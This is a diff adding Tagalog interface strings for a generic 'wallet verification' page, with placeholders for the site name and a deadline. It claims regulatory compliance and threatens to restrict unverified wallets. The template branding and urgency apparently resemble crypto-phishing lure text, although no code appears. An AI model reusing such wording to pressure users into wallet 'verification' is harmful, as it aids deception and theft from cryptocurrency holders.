@@ -1,0 +1,31 @@
+﻿{
+    "pageTitle": "Pag-verify ng Wallet | {websiteName}",
+    "mainTitle": "Kinakailangan ang Pag-verify ng Wallet",
+    "description1": "Para mapanatili ang mga pamantayan ng seguridad at pagsunod sa regulasyon, kinakailangan na namin ang pag-verify ng address ng wallet para sa lahat ng user.",
+    "deadlineText": "Simula sa {date}, anumang hindi na-verify na wallet ay",
+    "restrictionText": " pansamantalang magiging limitado",
+    "cooperationText": "Pinahahalagahan namin ang iyong pakikipagtulungan sa pagpapanatili ng aming platform na ligtas.",
+    "termsText": "Sumasang-ayon ako sa",
+    "termsLink": "Mga Tuntunin ng Paggamit ng {websiteName}",
+    "verifyBtnText": "I-verify ang Aking Wallet",
+    "securityBtnText": "Tungkol sa mga Compromised na Phrase",
+    "modalTitle": "Babala sa Seguridad: Mga Compromised na Recovery Phrase",
+    "modalWarning": "Kritikal na Babala:",
+    "modalWarningText": "Ang iyong recovery phrase ay ang master key ng iyong wallet. Huwag kailanman ibunyag ito sa sinuman o ipasok ito sa anumang website.",
+    "signsTitle": "Mga palatandaan ng compromised na phrase:",
+    "signsList": [
+        "Naibahagi sa isang taong nag-aangking suporta",
+        "Naka-imbak nang digital (mga larawan, cloud, mensahe)",
+        "Hindi awtorisadong mga transaksyon sa iyong wallet"
+    ],
+    "actionTitle": "Agarang aksyon na kinakailangan kung na-compromise:",
+    "actionList": [
+        "Ilipat agad ang lahat ng pondo sa isang bagong ligtas na wallet",
+        "Gumawa ng ganap na bagong recovery phrase",
+        "Huwag kailanman gamitin ang anumang bersyon ng dating phrase"
+    ],
+    "modalNote": "Tandaan: Hindi kailanman hihingin ng {websiteName} ang iyong recovery phrase. Ang prosesong ito ng pag-verify ay nangangailangan lamang ng iyong public wallet address."
+} 
+
+
+
